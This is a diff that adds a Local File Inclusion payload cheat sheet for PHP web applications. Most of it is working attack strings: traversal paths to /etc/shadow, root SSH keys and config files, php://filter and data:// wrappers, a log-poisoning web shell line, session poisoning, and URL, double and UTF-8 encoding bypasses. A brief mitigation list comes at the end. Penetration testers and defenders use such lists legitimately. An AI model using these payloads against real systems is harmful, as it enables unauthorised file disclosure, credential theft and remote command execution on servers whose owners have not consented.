@@ -1,0 +1,63 @@
+Local File Inclusion (LFI) Payloads:
+
+### Basic Directory Traversal:
+- ../../../../etc/passwd
+- ../../../../etc/hosts
+- ../../../../var/log/apache2/access.log
+- ../../../../proc/version
+- ../../../../etc/shadow (if readable)
+- ../../../../home/user/.bashrc
+- ../../../../var/www/html/config.php
+- ../../../../windows/system32/drivers/etc/hosts (Windows)
+
+### PHP Wrappers:
+- php://filter/convert.base64-encode/resource=index.php
+- php://filter/read=convert.base64-encode/resource=config.php
+- php://input (with POST data containing PHP code)
+- php://filter/convert.base64-encode/resource=../../../../etc/passwd
+- data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B (base64 encoded PHP)
+
+### Log Poisoning:
+- Inject PHP into access.log: <?php system($_GET['cmd']); ?>
+- Poison error.log with malicious code
+- Use User-Agent or other headers to inject
+
+### Session Files:
+- /var/lib/php/sessions/sess_SESSIONID
+- Poison session with PHP code
+
+### /proc/self/ Environment:
+- /proc/self/environ (read environment variables)
+- /proc/self/cmdline (command line)
+- /proc/self/fd/0 (stdin)
+
+### Bypass Techniques:
+- ....//....//etc/passwd
+- %2e%2e%2f (URL encoded ..)
+- ..%2f..%2f..%2fetc%2fpasswd
+- Null byte: ../../../../etc/passwd%00
+- Double encoding: %252e%252e%252f
+- UTF-8 encoding: %c0%ae%c0%ae/
+
+### Advanced Payloads:
+- ../../../../etc/crontab
+- ../../../../root/.ssh/id_rsa
+- ../../../../var/spool/cron/crontabs/root
+- ../../../../etc/mysql/my.cnf
+- ../../../../var/log/auth.log
+
+### Windows Specific:
+- ../../../../windows/system.ini
+- ../../../../boot.ini
+- ../../../../windows/win.ini
+
+### Detection and Testing:
+- Test with: ../../../../etc/passwd
+- Check for file content in response
+- Use base64 decoding if filtered
+
+### Mitigation Notes:
+- Disable allow_url_include in PHP
+- Use whitelisting for file paths
+- Implement proper input validation
+- Use realpath() to resolve paths
